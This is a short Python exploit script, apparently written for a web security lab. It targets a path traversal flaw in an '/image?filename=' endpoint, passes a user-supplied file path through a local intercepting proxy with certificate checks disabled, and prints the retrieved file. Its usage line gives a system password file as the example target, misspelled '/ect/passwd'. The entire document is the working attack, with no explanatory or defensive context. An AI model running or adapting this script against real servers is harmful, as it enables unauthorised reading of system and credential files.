import urllib3 
import requests
import sys

urllib3 = urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def path_traversal(s, url, file_name):
    file_path = '/image?filename='+file_name
    res = s.get(url+file_path, verify=False, proxies=proxies)
    if(res.status_code == 200):
        print("(+) Path Traversal succeeded")
        print(res.text)
    else:
        print("(-) Path Traversal failed")
        print(res.text)
        sys.exit(-1)

def main():
    if len(sys.argv) != 3:
        print("(+) Usage: %s <url> <file name> " %sys.argv[0])
        print("(+) Example: %s www.example.com /ect/passwd"%sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    file_name = sys.argv[2]
    print("(+) Exploiting Path Traversal Vulnerability...")
    s = requests.session()
    path_traversal(s, url, file_name)

if __name__ == '__main__':
    main()